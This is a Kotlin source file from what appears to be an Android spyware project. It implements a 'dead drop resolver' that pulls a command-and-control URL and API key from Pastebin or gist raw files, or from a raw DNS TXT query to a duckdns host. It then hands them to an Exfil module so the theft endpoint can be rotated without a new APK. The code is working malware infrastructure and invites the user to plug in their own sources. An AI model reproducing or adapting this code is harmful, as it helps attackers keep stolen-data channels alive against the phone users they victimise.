package com.sp.core.util

import android.content.Context
import android.util.Log
import com.sp.core.c2.Exfil
import okhttp3.OkHttpClient
import okhttp3.Request
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.util.concurrent.TimeUnit

/**
 * Dead Drop Resolver.
 *
 * The C2 endpoint is not hard-wired to a single host: it is also published as
 * plain text ("<url>|<api_key>") on public dead-drop sources. The payload
 * fetches them at runtime, so the infrastructure can be swapped without
 * shipping a new APK.
 *
 *  - HTTP sources: raw text files (pastebin raw / gist raw)
 *  - DNS source:   TXT record of [dnsHost] (resolved with a raw DNS query,
 *                  no third-party dependency)
 */
object DeadDrop {
    private const val TAG = "DeadDrop"

    private val client = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()

    /** Replace with your own raw-text sources. */
    val httpSources = listOf(
        "https://pastebin.com/raw/REPLACE_ME",
        "https://gist.githubusercontent.com/palcinkoo/REPLACE_ME/raw/sp.conf"
    )

    /** Host whose TXT record carries "<url>|<api_key>". */
    const val dnsHost = "sp-resolver.duckdns.org"

    private val dnsServers = listOf("1.1.1.1", "8.8.8.8", "9.9.9.9")

    /**
     * Resolves the current C2 config and (optionally) applies it.
     * @return "<url>|<key>" or null when no source answered.
     */
    fun resolve(ctx: Context, apply: Boolean = true): String? {
        val raw = fetchHttp() ?: fetchDns()
        if (raw.isNullOrBlank()) return null

        val line = raw.trim().lines()
            .map { it.trim() }
            .firstOrNull { it.startsWith("http") && it.contains("|") }
            ?: raw.trim()

        if (apply) {
            val parts = line.split("|", limit = 2)
            val url = parts[0].trim()
            if (url.startsWith("http")) {
                Exfil.setC2(ctx, url, parts.getOrNull(1)?.trim())
                Log.i(TAG, "C2 rotated -> $url")
            }
        }
        return line
    }

    private fun fetchHttp(): String? {
        for (src in httpSources) {
            if (src.contains("REPLACE_ME")) continue
            try {
                val req = Request.Builder().url(src)
                    .header("User-Agent", "Mozilla/5.0 (Android)")
                    .build()
                client.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        val body = resp.body?.string()
                        if (!body.isNullOrBlank()) return body
                    }
                }
            } catch (_: Throwable) {
            }
        }
        return null
    }

    private fun fetchDns(): String? {
        for (server in dnsServers) {
            val txt = queryTxt(server, dnsHost)
            if (!txt.isNullOrBlank()) return txt
        }
        return null
    }

    /** Minimal DNS TXT query (RFC 1035) over plain UDP. */
    private fun queryTxt(server: String, host: String): String? = try {
        val id = (System.nanoTime() and 0xFFFF).toInt()
        val q = ByteArray(512)
        var p = 0
        q[p++] = 0x12; q[p++] = 0x34                       // id
        q[p++] = 0x01; q[p++] = 0x00                       // flags: standard query, recursion desired
        q[p++] = 0x00; q[p++] = 0x01                       // qdcount
        q[p++] = 0x00; q[p++] = 0x00                       // ancount
        q[p++] = 0x00; q[p++] = 0x00                       // nscount
        q[p++] = 0x00; q[p++] = 0x00                       // arcount
        for (label in host.split(".")) {
            val bytes = label.toByteArray(Charsets.US_ASCII)
            q[p++] = bytes.size.toByte()
            System.arraycopy(bytes, 0, q, p, bytes.size)
            p += bytes.size
        }
        q[p++] = 0x00                                     // root label
        q[p++] = 0x00; q[p++] = 0x10                       // qtype = TXT
        q[p++] = 0x00; q[p++] = 0x01                       // qclass = IN

        DatagramSocket().use { socket ->
            socket.soTimeout = 4000
            val out = DatagramPacket(q, p, InetAddress.getByName(server), 53)
            socket.send(out)
            val buf = ByteArray(1024)
            val inPacket = DatagramPacket(buf, buf.size)
            socket.receive(inPacket)

            val data = inPacket.data
            var r = 12
            while (r < data.size && data[r].toInt() != 0) {   // skip qname
                r += data[r].toInt() + 1
            }
            r++                                             // root label
            r += 8                                          // qtype + qclass

            val answers = ((data[6].toInt() and 0xFF) shl 8) or (data[7].toInt() and 0xFF)
            repeat(answers) {
                if (r + 2 > data.size) return@repeat
                var pointer = false
                while (r < data.size && (data[r].toInt() and 0xFF) != 0) {
                    if ((data[r].toInt() and 0xC0) == 0xC0) { r += 2; pointer = true; break }
                    r += (data[r].toInt() and 0xFF) + 1
                }
                if (!pointer) r++
                if (r + 10 > data.size) return@repeat
                val type = ((data[r].toInt() and 0xFF) shl 8) or (data[r + 1].toInt() and 0xFF)
                val rdLen = ((data[r + 8].toInt() and 0xFF) shl 8) or (data[r + 9].toInt() and 0xFF)
                r += 10
                if (type == 16 && rdLen > 1 && r + rdLen <= data.size) {
                    val txtLen = data[r].toInt() and 0xFF
                    val txt = String(data, r + 1, minOf(txtLen, rdLen - 1), Charsets.US_ASCII)
                    if (txt.contains("|")) return txt
                }
                r += rdLen
            }
            null
        }
    } catch (_: Throwable) {
        null
    }
}
